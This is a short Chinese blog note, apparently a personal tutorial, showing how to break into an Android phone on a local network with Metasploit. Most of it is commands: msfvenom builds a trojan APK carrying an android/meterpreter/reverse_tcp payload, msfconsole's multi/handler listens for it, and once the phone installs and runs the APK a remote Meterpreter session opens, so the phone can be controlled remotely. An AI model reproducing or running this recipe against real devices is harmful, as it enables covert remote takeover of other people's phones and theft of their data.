---
title: 【笔记】msf 黑入安卓系统
categories:
  - 网络安全
date: 2020-01-10 17:29:40
---

## 前言

使用`msf`工具黑入手机安卓系统（局域网）

<!-- more -->

## 准备工作

- 安卓手机

- [msf](https://feiju12138.github.io/2019/11/16/安装配置Metasploit-Framework/)

## 开始测试

### 制作木马

#### 查看本机ip地址

``` sh
ifconfig
```

#### 利用msf制作安卓木马

> `<ip_address>`：本机局域网ip地址
> `<port>`：自定义端口号，用于监听木马程序
> `<name>`：安装包名称

``` sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=<port> R> ~/Downloads/<name>.apk
```

### 启动msf监听木马程序

``` sh
msfconsole 
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <ip_address>
set LPORT <port>
exploit
```

### 启动木马程序

- 安卓机和本机在同一局域网，安装并启动木马程序

- 本机返回`Meterpreter session 1 opened`，监听成功

![01.png](/images/20200110172940/01.png)

### 对手机进行远程操作

- 查看帮助

``` sh
meterpreter > help
```

## 完成

- 成功黑入后可对手机进行远程操作

- 展示三张成功黑入截图，留作纪念

![02.png](/images/20200110172940/02.png)

![03.png](/images/20200110172940/03.png)

![04.png](/images/20200110172940/04.png)

## 后记

- 本机返回`Meterpreter session 1 closed`，监听程序退出

## 参考文献

[哔哩哔哩——Hai_Dog](https://www.bilibili.com/video/av16375329/?spm_id_from=trigger_reload)
[哔哩哔哩——你会忘了我](https://www.bilibili.com/video/av33571463/?spm_id_from=333.788.videocard.0)

